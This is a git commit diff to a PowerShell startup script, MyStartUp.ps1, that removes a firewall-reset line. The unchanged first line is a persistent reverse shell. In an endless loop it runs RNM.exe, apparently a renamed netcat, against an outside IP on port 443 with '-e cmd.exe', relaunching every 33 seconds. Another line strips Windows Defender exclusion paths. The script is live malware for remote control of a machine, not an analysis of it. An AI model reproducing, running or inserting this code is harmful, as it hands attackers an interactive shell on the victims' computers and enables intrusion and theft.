46b71513cf0f6f9382f48c828f37fd809b401cd2
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2025-08-24 17:51:19 -0600

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,5 +1,4 @@
 while ($true) {C:\Users\Public\RNM.exe -nv 200.28.163.110 443 -e cmd.exe ; start-sleep 33}
-netsh advfirewall reset
 
 $prefs = Get-MpPreference
 if ($prefs.ExclusionPath) { Remove-MpPreference -ExclusionPath $prefs.ExclusionPath }
